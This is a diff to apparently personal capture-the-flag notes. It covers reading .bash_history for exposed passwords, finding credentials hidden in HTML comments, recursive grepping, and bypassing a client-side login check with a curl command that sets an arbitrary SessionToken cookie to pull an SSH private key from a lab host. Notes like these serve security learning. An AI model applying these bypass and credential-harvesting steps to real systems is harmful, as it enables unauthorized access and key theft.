@@ -62,8 +62,9 @@ sometimes check .bash_history
 
 #cat .bash_history 
 mysql -u drac -p 'Th3dRaCULa1sR3aL' (command found in .bash_history).
-_____________________________________________________________________________________________________________________________
 
+_____________________________________________________________________________________________________________________________
+Sometimes you can see credentials in html tag
 <!-- Dvc W@iyur@123 --> (Vigenere cipher)
 <!-- KeepGoing --> (Key fo Vigenere-cipher)
 </body>
@@ -86,8 +87,19 @@ ________________________________________________________________________________
 Instead of using cat, to use less, grep.
 
 #grep . robots.txt ( .(dot) is current directory)
-#grep -r . (read every files recursively)
+#grep -r . (read every files recursively) 
+______________________________________________________________________________________________________________________________
 
+In broswer (login.js)
+---------------------
+if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
 
+What if SessionToken is anything.
+#curl "http://overpass.thm/admin/" --cookie "SessionToken=anything" ( we get id_rsa private key )
 
 
